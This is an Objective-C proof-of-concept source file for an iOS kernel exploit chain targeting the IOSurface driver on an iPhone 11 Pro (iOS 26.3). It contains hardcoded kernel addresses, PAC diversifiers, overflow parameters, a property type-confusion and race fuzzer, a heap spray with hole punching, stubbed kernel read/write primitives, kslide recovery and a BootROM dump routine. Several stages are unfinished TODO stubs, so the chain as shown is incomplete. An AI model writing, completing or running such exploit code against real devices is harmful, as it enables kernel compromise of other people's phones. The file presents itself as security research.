/*
 * Chain B PoC: IOSurface -> Kernel R/W -> BootROM Dump
 * =====================================================================
 * Target: iPhone 11 Pro (A13 / T8030), iOS 26.3
 *
 * All addresses resolved from kernelcache static analysis (Phases 1-8).
 * KC_BASE: 0xfffffff007004000 (add kslide at runtime).
 *
 * ANALYSIS NOTES (Phase 8):
 *   The main IOSurface size computation is HARDENED with UMULH overflow
 *   checks (__builtin_mul_overflow). 98 MUL-family instructions found,
 *   all critical multiplication paths use UMULH + CBNZ/CMP pattern.
 *   IOSurface_max_check (0xa1d02d0) only validates SECONDARY params
 *   (subsampling, extended pixels, tile format) — NOT main dimensions.
 *   Main dimensions checked via UMULH → CBNZ in create function at
 *   0xfffffff00a1cb59c (~700 insns).
 *
 * REVISED STRATEGY:
 *   B0: IOSurfaceRootUserClient connection
 *   B1: Property type confusion via s_set_value / s_set_value_xml
 *       (set property as one type, read as another for type confusion)
 *   B1-alt: Race condition between surface operations (UAF)
 *   B2: Heap spray via s_set_value (selector 4) -> OOB -> kernel R/W
 *   B3: kslide recovery + PAC v1 data-only bypass
 *   B4: ml_phys_read(0x100000000, 8) loop -> BootROM dump
 *
 * BUILD:
 *   xcrun -sdk iphoneos clang -arch arm64 -framework IOSurface \
 *     -framework IOKit -framework CoreFoundation \
 *     -o chain_b chain_b_poc.m
 *
 * DISCLAIMER: For security research on your own devices only.
 */

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurface.h>
#import <mach/mach.h>
#import <pthread.h>
#import <sys/mman.h>

/* ============================================================
 * RESOLVED KERNEL ADDRESSES (from kernelcache Phases 1-4)
 * All virtual addresses are UNSLID -- add kslide at runtime.
 * ============================================================ */

/* Kernel Collection base */
#define KC_BASE                     0xfffffff007004000ULL

/* Kernel R/W primitives */
#define ML_PHYS_READ_VA             0xfffffff00814f740ULL
#define ML_PHYS_WRITE_VA            0xfffffff00814f9f0ULL
#define GPHYSBASE_PTR_VA            0xfffffff007b00bb8ULL
#define GPHYSEND_PTR_VA             0xfffffff007b00bc0ULL

/* IOSurface vtables (PAC-DA signed, diversity 0xcda1) */
#define ISRUC_VTABLE_VA             0xfffffff007f22598ULL
#define ISRUC_VTABLE_METHODS_VA     0xfffffff007f225a8ULL
#define IOSURFACE_VTABLE_VA         0xfffffff007f21fa0ULL
#define IOSURFACE_VTABLE_METHODS_VA 0xfffffff007f21fb0ULL
#define ISRUC_ALLOC_SIZE            0x148

/* Dispatch table (PAC-IA signed, diversity 0x705d, 26 entries x 24 bytes) */
#define DISPATCH_TABLE_VA           0xfffffff007f238e8ULL
#define DISPATCH_ENTRY_SIZE         24
#define DISPATCH_SELECTOR_COUNT     26

/* Handler addresses (BTI+B trampoline resolved) */
#define S_CREATE_SURFACE_VA         0xfffffff00a1eba5cULL
#define S_RELEASE_SURFACE_VA        0xfffffff00a1ebb80ULL
#define S_LOCK_VA                   0xfffffff00a1ebca4ULL
#define S_UNLOCK_VA                 0xfffffff00a1ebe54ULL
#define S_SET_VALUE_VA              0xfffffff00a1ea1c0ULL
#define S_GET_VALUE_VA              0xfffffff00a1ea038ULL
#define S_INCREMENT_USE_COUNT_VA    0xfffffff00a1ebefcULL
#define S_DECREMENT_USE_COUNT_VA    0xfffffff00a1ebfd8ULL
#define S_LOOKUP_VA                 0xfffffff00a1e9220ULL
#define S_LOOKUP_BY_NAME_VA         0xfffffff00a1ec07cULL
#define S_SET_VALUE_XML_VA          0xfffffff00a1ecfe8ULL
#define S_REMOVE_VALUE_VA           0xfffffff00a1ef34cULL

/* Overflow path functions */
#define CREATE_INTERNAL_VA          0xfffffff00a1edafcULL
#define SURFACE_ARRAY_LOOKUP_VA     0xfffffff00a1eda10ULL
#define IOSURFACE_MAX_CHECK_VA      0xfffffff00a1d02d0ULL
#define MAX_CHECK_COMPUTE_VA        0xfffffff00a1d0384ULL
#define IOSURFACE_ALLOCATE_VA       0xfffffff00a1cece8ULL
#define IOBUF_MEMDESC_HANDLER_VA    0xfffffff00a1e5be0ULL
#define OS_LOG_VA                   0xfffffff008670688ULL

/* IOSurface kext code range */
#define IOSURFACE_TEXT_EXEC_START   0xfffffff00a1c5c80ULL
#define IOSURFACE_TEXT_EXEC_END     0xfffffff00a1f75dcULL

/* PAC signing context (corrected from Phase 6 full vtable resolution) */
#define PAC_VTABLE_DIVERSITY        0xcda1  /* DA key — vtable pointer auth */
#define PAC_DISPATCH_DIVERSITY      0x705d  /* IA key — dispatch table entries */
#define PAC_RETAIN_DIV              0x2e4a  /* IA — vtable+0x20 (retain) */
#define PAC_RELEASE_DIV             0x3a87  /* IA — vtable+0x28 (release) */
#define PAC_METHOD_0x40_DIV         0xfc74  /* IA — vtable+0x40 */
#define PAC_METHOD_0x78_DIV         0x5c68  /* IA — vtable+0x78 */
#define PAC_GETVALUE_DIV            0xaf75  /* IA — vtable+0x90 (getValue) */
#define PAC_METHOD_0xa8_DIV         0x43aa  /* IA — vtable+0xa8 */
#define PAC_SETTER_DIV              0x12e9  /* IA — vtable+0xb0 (setter) */
#define PAC_METHOD_0xb8_DIV         0x4578  /* IA — vtable+0xb8 */
#define PAC_SETVALUE_DIV            0x1d35  /* IA — vtable+0xe8 (setValue) */
#define PAC_GETITEM_DIV             0x82eb  /* IA — vtable+0x108 (getItem) */
#define PAC_GETTER_DIV              0xb3b6  /* IA — vtable+0x138 (getter) */
#define PAC_AUTH_PTR_0x390          0xda2b  /* DA — PAC ptr at struct+0x390 */
#define PAC_ALLOC_0x80_DIV          0xf505  /* IA — allocate vtable+0x80 */
#define PAC_ALLOC_0x78_DIV          0x2aba  /* IA — allocate vtable+0x78 */
#define PAC_ALLOC_0xa8_DIV          0xba55  /* IA — allocate vtable+0xa8 */
#define PAC_ARRAY_LOOKUP            0xf69b
#define PAC_ARRAY_PTR               0xc8a2

/* IOSurface struct field offsets */
#define IOSURFACE_OFF_WIDTH         0x58
#define IOSURFACE_OFF_HEIGHT        0x60
#define IOSURFACE_OFF_BPE           0x78
#define IOSURFACE_OFF_ELEM_WIDTH    0x80
#define IOSURFACE_OFF_BPR           0x90
#define IOSURFACE_OFF_ALLOC_SIZE    0x98
#define IOSURFACE_OFF_LOCK          0xd8
#define IOSURFACE_OFF_ARRAY_PTR     0x108
#define IOSURFACE_OFF_ARRAY_COUNT   0x110
#define IOSURFACE_OFF_TASK_ID       0x118
#define IOSURFACE_OFF_SURFACE_OBJ   0x140
#define IOSURFACE_OFF_CONTAINER     0x10   /* container pointer */
#define IOSURFACE_OFF_STORED_VAL    0x20   /* value manipulated by setter */
#define IOSURFACE_OFF_ALLOC_DESC    0x30   /* allocation descriptor */
#define IOSURFACE_OFF_EXISTING_ALLOC 0x368 /* existing allocation ptr */
#define IOSURFACE_OFF_PAC_PTR       0x390  /* PAC-DA authenticated ptr */
#define IOSURFACE_OFF_FLAGS         0x3c0  /* bits: 0xb=compressed, 0xe=format,
                                              0x17=flag, 0x1a=useDMA */

/* Phase 6 vtable method targets (trampoline-resolved) */
#define VT_RETAIN_VA                0xfffffff0086220c8ULL  /* vtable+0x20 */
#define VT_RELEASE_VA               0xfffffff0086220a0ULL  /* vtable+0x28 */
#define VT_GETTER_VA                0xfffffff0086a1008ULL  /* vtable+0x138 (OSObject getter) */
#define VT_SETTER_VA                0xfffffff0086a2488ULL  /* vtable+0xb0 (OSObject setter) */
#define VT_SETVALUE_VA              0xfffffff0086a1c38ULL  /* vtable+0xe8 (setValue) */
#define VT_GETVALUE_VA              0xfffffff0086a2bb8ULL  /* vtable+0x90 (getValue) */
#define VT_GETITEM_VA               0xfffffff0086a18dcULL  /* vtable+0x108 (getItem/lookup) */
#define KERNEL_HELPER_VA            0xfffffff00861ed6cULL  /* linked list search */

/* Phase 7-8: Main create function with overflow-protected arithmetic */
#define CREATE_SETUP_FUNC_VA        0xfffffff00a1cb59cULL  /* ~700 insns, processes all dims */
#define ALLOC_SUB_VA                0xfffffff00a1dd038ULL  /* allocation sub-call */

/* BootROM target (T8030) */
#define BOOTROM_PHYS_BASE           0x100000000ULL
#define BOOTROM_SIZE                0x20000

/* IOSurface dispatch selectors */
#define SEL_CREATE_SURFACE          0
#define SEL_RELEASE_SURFACE         1
#define SEL_LOCK                    2
#define SEL_UNLOCK                  3
#define SEL_SET_VALUE               4
#define SEL_GET_VALUE               5
#define SEL_INCREMENT_USE_COUNT     6
#define SEL_DECREMENT_USE_COUNT     7
#define SEL_LOOKUP                  8
#define SEL_LOOKUP_BY_NAME          9
#define SEL_SET_VALUE_XML           10
#define SEL_GET_VALUE_XML           11
#define SEL_REMOVE_VALUE            12

/* Spray parameters */
#define SPRAY_COUNT                 256
#define HOLE_INTERVAL               2
#define SPRAY_SIZE                  0x100

#define PAC_MASK                    0x007F000000000000ULL
#define STRIP_PAC(ptr)              ((ptr) & ~PAC_MASK)

typedef uint64_t kaddr_t;

/* ============================================================
 * GLOBALS
 * ============================================================ */

static io_connect_t g_client = 0;
static IOSurfaceRef g_surfaces[SPRAY_COUNT];
static IOSurfaceRef g_overflow_surface = NULL;
static kaddr_t g_kslide = 0;
static kaddr_t g_kernel_base = 0;
static int g_overlap_idx = -1;

static kaddr_t (*kread64)(kaddr_t addr) = NULL;
static void (*kwrite64)(kaddr_t addr, uint64_t value) = NULL;

/* ============================================================
 * B0: IOKit Connection Setup
 * ============================================================ */

static io_connect_t open_iosurface_client(void) {
    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching("IOSurfaceRoot")
    );
    if (service == IO_OBJECT_NULL) {
        NSLog(@"[!] IOSurfaceRoot service not found");
        return 0;
    }

    io_connect_t client = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &client);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        NSLog(@"[!] IOServiceOpen failed: 0x%x", kr);
        return 0;
    }

    NSLog(@"[+] IOSurfaceRootUserClient opened (handle 0x%x)", client);
    return client;
}

static IOSurfaceRef create_surface_ex(uint32_t width, uint32_t height,
                                       uint32_t bytesPerElement, uint32_t format) {
    uint32_t bpr = width * bytesPerElement;
    NSDictionary *props = @{
        @"IOSurfaceWidth":            @(width),
        @"IOSurfaceHeight":           @(height),
        @"IOSurfaceBytesPerRow":      @(bpr),
        @"IOSurfaceBytesPerElement":  @(bytesPerElement),
        @"IOSurfacePixelFormat":      @(format),
        @"IOSurfaceAllocSize":        @(bpr * height),
        @"IOSurfaceIsGlobal":         @YES,
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

/* ============================================================
 * B1: Attack Surface Analysis (Phase 8 REVISED)
 * ============================================================
 *
 * PHASE 8 FINDING: Integer overflow in main dimensions is HARDENED.
 * The create function at 0xfffffff00a1cb59c uses:
 *   UMULH x_hi, src1, src2 → CBNZ x_hi (128-bit overflow check)
 *   UMULL x, w1, w2 → LSR #32 → CBNZ (64→32 overflow check)
 *   ADDS x, x, x → B.HS (addition carry check)
 *
 * IOSurface_max_check (0xa1d02d0) → max_check_compute (0xa1d0384)
 * is NOT a multiplier — it's a property lookup via:
 *   vtable+0x138 (getter, div 0xb3b6) + kernel_helper (0x861ed6c)
 *   + vtable+0xb0 (setter, div 0x12e9)
 * Only checks: Subsampling, ExtendedPixels, BufferTileFormat
 *
 * STRATEGY: Property type confusion OR race condition
 * s_set_value_xml (sel 10) deserializes XML plist → OSDictionary
 * s_set_value (sel 4) sets property via OSSerialize
 * If type of key can be changed between set/get → type confusion.
 */

typedef struct {
    const char *name;
    uint32_t width;
    uint32_t height;
    uint32_t bpe;
    uint32_t expected_alloc;
    uint64_t logical_size;
} overflow_params_t;

static overflow_params_t g_overflow_sets[] = {
    {
        "set_A: 256KB alloc, ~16GB logical",
        0x4001, 0x4000, 4,
        0x40000,
        0x400040000ULL,
    },
    {
        "set_B: 64KB alloc via bpe overflow",
        0x100, 0x100, 0x10001,
        0x10000,
        0x1000100000ULL,
    },
    {
        "set_C: ~65KB alloc, ~16MB logical",
        0x101, 0x100, 0x100,
        0x10100,
        0x1010000ULL,
    },
};

static int trigger_overflow(int param_set) {
    overflow_params_t *p = &g_overflow_sets[param_set];
    NSLog(@"[*] B1: Trying overflow %s", p->name);
    NSLog(@"    width=0x%x height=0x%x bpe=0x%x", p->width, p->height, p->bpe);

    uint32_t bpr = p->width * p->bpe;
    NSDictionary *props = @{
        @"IOSurfaceWidth":            @(p->width),
        @"IOSurfaceHeight":           @(p->height),
        @"IOSurfaceBytesPerRow":      @(bpr),
        @"IOSurfaceBytesPerElement":  @(p->bpe),
        @"IOSurfacePixelFormat":      @(0x42475241),
        @"IOSurfaceAllocSize":        @(p->expected_alloc),
    };

    g_overflow_surface = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!g_overflow_surface) {
        NSLog(@"[!] Surface creation REJECTED (max_check caught it)");
        return -1;
    }

    size_t reported = IOSurfaceGetAllocSize(g_overflow_surface);
    NSLog(@"[+] Surface created! Reported alloc: 0x%zx", reported);

    if (reported <= p->expected_alloc * 2) {
        NSLog(@"[+] SMALL ALLOCATION -> OOB potential!");
        return 0;
    }

    NSLog(@"[-] Allocation too large, no overflow");
    CFRelease(g_overflow_surface);
    g_overflow_surface = NULL;
    return -1;
}

/* ============================================================
 * B1-ALT: Property Type Confusion Fuzzer
 * ============================================================
 *
 * Strategy: Set a property as one OSObject type, attempt to
 * retrieve/use it as another via different code paths.
 *
 * s_set_value (sel 4): Sets via OSSerialize -> OSDictionary
 * s_set_value_xml (sel 10): Sets via XML plist -> OSUnserialize
 * s_get_value (sel 5): Gets raw OSObject from dictionary
 *
 * Type confusion targets:
 *   OSData   (0x18 bytes header + data) -> treated as OSDictionary
 *   OSString (0x18 bytes header + chars) -> treated as OSData
 *   OSNumber (0x20 bytes, inline value) -> pointer read as address
 *
 * If IOSurface stores a property as OSData{ptr=X, len=Y} and
 * a code path interprets it as OSNumber{value=Z}, the bytes
 * at the data pointer become the "value" — arbitrary read.
 */

static int fuzz_property_types(void) {
    NSLog(@"[*] B1-ALT: Property type confusion fuzzer");

    IOSurfaceRef surf = create_surface_ex(64, 64, 4, 0x42475241);
    if (!surf) return -1;

    /* Test 1: Set as OSData, read back type */
    uint8_t blob[32];
    memset(blob, 0x41, sizeof(blob));
    NSData *data = [NSData dataWithBytes:blob length:sizeof(blob)];
    IOSurfaceSetValue(surf, CFSTR("test_data"), (__bridge CFTypeRef)data);

    CFTypeRef ret = IOSurfaceCopyValue(surf, CFSTR("test_data"));
    if (ret) {
        NSLog(@"    Set OSData -> Got type: %lu (CFData=%lu, CFString=%lu, CFNumber=%lu)",
              CFGetTypeID(ret), CFDataGetTypeID(), CFStringGetTypeID(), CFNumberGetTypeID());
        CFRelease(ret);
    }

    /* Test 2: Set as OSNumber, read back */
    IOSurfaceSetValue(surf, CFSTR("test_num"), (__bridge CFTypeRef)@(0x4141414142424242ULL));
    ret = IOSurfaceCopyValue(surf, CFSTR("test_num"));
    if (ret) {
        NSLog(@"    Set OSNumber -> Got type: %lu", CFGetTypeID(ret));
        if (CFGetTypeID(ret) == CFNumberGetTypeID()) {
            uint64_t val = 0;
            CFNumberGetValue((CFNumberRef)ret, kCFNumberSInt64Type, &val);
            NSLog(@"    Value: 0x%llx", val);
        }
        CFRelease(ret);
    }

    /* Test 3: Set nested dictionary with crafted keys matching
     * IOSurface internal property names. Some keys are handled
     * specially by the kernel (e.g., "IOSurfaceAllocSize") */
    NSDictionary *nested = @{
        @"IOSurfaceAllocSize": @(0xDEADBEEF),
        @"IOSurfaceBytesPerRow": @(0xFFFFFFFF),
    };
    IOSurfaceSetValue(surf, CFSTR("IOSurfacePlaneInfo"),
                      (__bridge CFTypeRef)nested);

    /* Test 4: Set XML with mismatched types via IOConnectCallMethod
     * (bypasses IOSurfaceSetValue type filtering) */
    NSLog(@"    [TODO] Direct IOConnectCallMethod with crafted struct input");
    NSLog(@"    selector %d, struct input = serialized XML plist", SEL_SET_VALUE_XML);

    /* Test 5: Rapid set/get race */
    __block volatile int race_hit = 0;
    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0);

    dispatch_async(q, ^{
        for (int i = 0; i < 100000 && !race_hit; i++) {
            IOSurfaceSetValue(surf, CFSTR("race_key"),
                              (__bridge CFTypeRef)@(i));
        }
    });
    dispatch_async(q, ^{
        for (int i = 0; i < 100000 && !race_hit; i++) {
            NSData *d = [NSData dataWithBytes:blob length:8];
            IOSurfaceSetValue(surf, CFSTR("race_key"),
                              (__bridge CFTypeRef)d);
        }
    });

    /* Small window to race */
    usleep(500000);
    ret = IOSurfaceCopyValue(surf, CFSTR("race_key"));
    if (ret) {
        CFTypeID tid = CFGetTypeID(ret);
        NSLog(@"    After race: type=%lu", tid);
        CFRelease(ret);
    }
    race_hit = 1;

    CFRelease(surf);
    return 0;
}

/* ============================================================
 * B2: Heap Spray + OOB -> Kernel R/W
 * ============================================================
 *
 * s_set_value (0xfffffff00a1ea1c0, selector 4):
 *   Loads lock from [x0, +0xd8]
 *   AUTDA vtable with 0xcda1
 *   Calls vtable+0xe8 with PAC diversity 0xc302 (setValue)
 *   Then vtable+0x28 with diversity 0x3a87 (release)
 *
 * s_get_value (0xfffffff00a1ea038, selector 5):
 *   AUTDA vtable with 0xcda1
 *   Calls vtable+0x90 with diversity 0x29e8 (getValue)
 *   Then vtable+0x118 for value retrieval
 */

static void heap_spray(void) {
    NSLog(@"[*] B2: Spraying %d surfaces...", SPRAY_COUNT);

    for (int i = 0; i < SPRAY_COUNT; i++) {
        g_surfaces[i] = create_surface_ex(64, 64, 4, 0x42475241);
    }

    int freed = 0;
    for (int i = 0; i < SPRAY_COUNT; i += HOLE_INTERVAL) {
        if (g_surfaces[i]) {
            CFRelease(g_surfaces[i]);
            g_surfaces[i] = NULL;
            freed++;
        }
    }
    NSLog(@"[+] Created holes: %d freed of %d", freed, SPRAY_COUNT);
}

static void spray_properties(void) {
    NSLog(@"[*] B2: Spraying properties via s_set_value (sel %d)...", SEL_SET_VALUE);

    uint8_t spray_data[SPRAY_SIZE];
    memset(spray_data, 'A', SPRAY_SIZE);
    *(uint64_t *)&spray_data[0] = 0x4141414142424242ULL;

    NSData *data = [NSData dataWithBytes:spray_data length:SPRAY_SIZE];
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (g_surfaces[i]) {
            NSString *key = [NSString stringWithFormat:@"spray_%d", i];
            IOSurfaceSetValue(g_surfaces[i],
                              (__bridge CFStringRef)key,
                              (__bridge CFTypeRef)data);
            sprayed++;
        }
    }
    NSLog(@"[+] Sprayed %d properties (%d bytes each)", sprayed, SPRAY_SIZE);
}

static int scan_for_overlap(void) {
    NSLog(@"[*] B2: Scanning via s_get_value (sel %d)...", SEL_GET_VALUE);

    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (!g_surfaces[i]) continue;

        NSString *key = [NSString stringWithFormat:@"spray_%d", i];
        CFTypeRef val = IOSurfaceCopyValue(g_surfaces[i], (__bridge CFStringRef)key);
        if (!val) continue;

        if (CFGetTypeID(val) == CFDataGetTypeID()) {
            const uint8_t *ptr = CFDataGetBytePtr((CFDataRef)val);
            uint64_t qw = *(uint64_t *)ptr;
            if (qw != 0x4141414142424242ULL) {
                NSLog(@"[+] OVERLAP at surface %d! leaked=0x%llx", i, qw);
                CFRelease(val);
                return i;
            }
        }
        CFRelease(val);
    }

    NSLog(@"[-] No overlap detected");
    return -1;
}

/* ============================================================
 * B2b: Kernel R/W Primitives
 * ============================================================
 *
 * OSData kernel layout (ARM64):
 *   +0x00: vtable (PAC-signed)
 *   +0x08: retainCount
 *   +0x10: capacity (uint32)
 *   +0x14: length   (uint32)
 *   +0x18: data     (pointer) <- corrupt this for arb R/W
 */

static kaddr_t kread64_impl(kaddr_t addr) {
    if (g_overlap_idx < 0) return 0;

    /* TODO: Use OOB write from overflow surface to set OSData->data = addr,
     * then IOSurfaceCopyValue reads from addr.
     * The OOB write offset depends on heap layout at runtime. */

    NSString *key = [NSString stringWithFormat:@"spray_%d", g_overlap_idx];
    CFTypeRef val = IOSurfaceCopyValue(g_surfaces[g_overlap_idx],
                                       (__bridge CFStringRef)key);
    if (val && CFGetTypeID(val) == CFDataGetTypeID()) {
        const uint8_t *ptr = CFDataGetBytePtr((CFDataRef)val);
        kaddr_t result = *(kaddr_t *)ptr;
        CFRelease(val);
        return result;
    }
    if (val) CFRelease(val);
    return 0;
}

static void kwrite64_impl(kaddr_t addr, uint64_t value) {
    if (g_overlap_idx < 0) return;
    /* TODO: Use OOB write to set OSData->data = addr, then
     * IOSurfaceSetValue writes value. */
    (void)addr; (void)value;
}

/* ============================================================
 * B3: kslide Recovery
 * ============================================================
 *
 * Read any kernel object vtable pointer.
 * Known IOSurface vtable (unslid): 0xfffffff007f21fa0
 * kslide = STRIP_PAC(leaked_vtable) - 0xfffffff007f21fa0
 */

static kaddr_t recover_kslide(void) {
    NSLog(@"[*] B3: Recovering kernel slide...");

    kaddr_t leaked = kread64(0);
    kaddr_t stripped = STRIP_PAC(leaked);

    if ((stripped >> 40) != 0xffffff) {
        NSLog(@"[!] Not a kernel pointer: 0x%llx", leaked);
        return 0;
    }

    kaddr_t candidates[] = { IOSURFACE_VTABLE_VA, ISRUC_VTABLE_VA };
    for (int i = 0; i < (int)(sizeof(candidates)/sizeof(candidates[0])); i++) {
        kaddr_t slide = stripped - candidates[i];
        if ((slide & 0x3FFF) == 0 && slide < 0x20000000ULL) {
            NSLog(@"[+] kslide = 0x%llx", slide);
            g_kslide = slide;
            g_kernel_base = KC_BASE + slide;
            return slide;
        }
    }

    NSLog(@"[-] Could not determine kslide");
    return 0;
}

/* ============================================================
 * B4: BootROM Dump via ml_phys_read
 * ============================================================
 *
 * ml_phys_read (0xfffffff00814f740 + kslide):
 *   x0 = physical address,  w1 = byte count (1/2/4/8)
 *   Returns value at physical address.
 *   Uses 16KB pages, checks gPhysBase..gPhysEnd.
 *
 * Calling from userspace requires kernel_call primitive:
 *   Option A: vtable redirect -> gadget -> ml_phys_read
 *   Option B: IOConnectTrap6 handler overwrite
 *   Option C: syscall table entry overwrite
 */

static void dump_bootrom(void) {
    NSLog(@"[*] B4: Dumping BootROM (T8030)...");
    NSLog(@"    Range: 0x%llx - 0x%llx (%d KB)",
          BOOTROM_PHYS_BASE, BOOTROM_PHYS_BASE + BOOTROM_SIZE - 1,
          BOOTROM_SIZE / 1024);

    kaddr_t ml_phys_read_slid = ML_PHYS_READ_VA + g_kslide;
    NSLog(@"    ml_phys_read (slid): 0x%llx", ml_phys_read_slid);

    uint8_t *rom = (uint8_t *)malloc(BOOTROM_SIZE);
    if (!rom) { NSLog(@"[!] malloc failed"); return; }

    /* TODO: Implement kernel_call to invoke ml_phys_read.
     *
     * for (uint64_t off = 0; off < BOOTROM_SIZE; off += 8) {
     *     uint64_t val = kernel_call(ml_phys_read_slid,
     *                                BOOTROM_PHYS_BASE + off, 8);
     *     *(uint64_t *)(rom + off) = val;
     *     if (off % 0x4000 == 0)
     *         NSLog(@"    Progress: 0x%llx / 0x%x", off, BOOTROM_SIZE);
     * }
     */

    const char *path = "/var/tmp/bootrom_t8030.bin";
    FILE *f = fopen(path, "wb");
    if (f) {
        fwrite(rom, 1, BOOTROM_SIZE, f);
        fclose(f);
        NSLog(@"[+] BootROM saved to %s", path);
    } else {
        NSLog(@"[!] Cannot write %s", path);
    }
    free(rom);
}

/* ============================================================
 * MAIN
 * ============================================================ */

int main(int argc, char *argv[]) {
    @autoreleasepool {
        NSLog(@"================================================================");
        NSLog(@"Chain B: IOSurface Overflow -> Kernel R/W -> BootROM Dump");
        NSLog(@"Target: iPhone 11 Pro (A13/T8030), iOS 26.3");
        NSLog(@"================================================================");

        /* B0 */
        g_client = open_iosurface_client();
        if (!g_client) return 1;

        /* B1: Integer overflow (likely blocked by UMULH checks) */
        NSLog(@"\n=== STAGE B1: Integer Overflow (legacy) ===");
        int overflow_ok = -1;
        for (int i = 0; i < (int)(sizeof(g_overflow_sets)/sizeof(g_overflow_sets[0])); i++) {
            if (trigger_overflow(i) == 0) {
                overflow_ok = i;
                break;
            }
        }
        if (overflow_ok < 0) {
            NSLog(@"[*] All overflow sets rejected (expected on iOS 26.3)");
            NSLog(@"    UMULH checks at 0x%llx block 64-bit overflows",
                  CREATE_SETUP_FUNC_VA);
        }

        /* B1-ALT: Property type confusion */
        NSLog(@"\n=== STAGE B1-ALT: Property Type Confusion ===");
        fuzz_property_types();

        /* B2: Heap spray */
        NSLog(@"\n=== STAGE B2: Heap Spray & OOB ===");
        heap_spray();
        spray_properties();
        g_overlap_idx = scan_for_overlap();

        if (g_overlap_idx >= 0) {
            kread64  = kread64_impl;
            kwrite64 = kwrite64_impl;

            /* B3 */
            NSLog(@"\n=== STAGE B3: kslide Recovery ===");
            recover_kslide();

            if (g_kslide) {
                NSLog(@"[+] base=0x%llx  ml_phys_read=0x%llx",
                      g_kernel_base, ML_PHYS_READ_VA + g_kslide);

                /* B4 */
                NSLog(@"\n=== STAGE B4: BootROM Dump ===");
                dump_bootrom();
            }
        } else {
            NSLog(@"[!] No overlap -- adjust spray params");
        }

        /* Cleanup */
        if (g_overflow_surface) CFRelease(g_overflow_surface);
        for (int i = 0; i < SPRAY_COUNT; i++)
            if (g_surfaces[i]) CFRelease(g_surfaces[i]);
        if (g_client) IOServiceClose(g_client);

        NSLog(@"\n================================================================");
        NSLog(@"Chain B PoC Complete");
        NSLog(@"================================================================");
    }
    return 0;
}
